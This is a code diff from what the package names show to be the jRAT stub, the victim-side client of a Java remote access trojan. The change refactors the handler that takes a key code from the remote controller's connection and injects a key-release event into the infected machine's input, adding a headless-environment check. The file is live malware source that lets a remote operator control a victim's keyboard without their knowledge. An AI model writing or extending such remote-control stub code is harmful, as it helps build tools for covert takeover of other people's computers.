@@ -1,19 +1,20 @@
 package se.jrat.stub.packets.incoming;
 
 import se.jrat.stub.Connection;
-import se.jrat.stub.Main;
+import se.jrat.stub.utils.ScreenUtils;
 
 public class Packet95KeyRelease extends AbstractIncomingPacket {
 
 	@Override
 	public void read() throws Exception {
 		int btn = Connection.instance.readInt();
-		try {
-			Main.robot.keyRelease(btn);
-		} catch (IllegalArgumentException e) {
+		
+		if (!ScreenUtils.isHeadless()) {
+			try {
+				ScreenUtils.getDefault().keyRelease(btn);
+			} catch (IllegalArgumentException e) {
 
-		} catch (Exception e) {
-			e.printStackTrace();
+			}
 		}
 	}
 
